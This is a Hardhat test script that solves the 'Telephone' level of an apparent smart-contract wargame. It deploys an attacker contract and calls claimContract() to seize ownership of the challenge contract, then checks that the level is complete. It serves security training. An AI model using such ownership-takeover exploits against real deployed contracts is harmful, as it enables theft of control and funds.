import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { Contract } from "ethers";
import { ethers } from "hardhat";
import { getNewInstance, submitInstance } from "../utils";

const LEVEL_ADDRESS = "0x0b6F6CE4BCfB70525A31454292017F640C10c768";

let owner: SignerWithAddress;
let attacker: SignerWithAddress;
let txn: any;
let contract: Contract;
let attackContract: Contract;

describe.only("Telephone", () => {

    beforeEach(async () => {
        [owner, attacker] = await ethers.getSigners();

        const contractFactory = await ethers.getContractFactory("Telephone");
        const challengeAddr = await getNewInstance(LEVEL_ADDRESS);
        contract = await contractFactory.attach(challengeAddr);

        const telephoneAttackFactory = await ethers.getContractFactory("TelephoneAttack");
        attackContract = await telephoneAttackFactory.deploy(contract.address);
    });

    it("Should solve the challenge", async function () {
        
        const initialOwner = await contract.owner();

        expect(await submitInstance(contract.address)).to.be.false;
        expect(initialOwner).to.not.equal(owner.address);

        txn = await attackContract.claimContract();
        await txn.wait();

        const currentOwner = await contract.owner();

        expect(currentOwner).to.equal(owner.address);
        expect(await submitInstance(contract.address), "level is not complete").to.be.true;
    });
});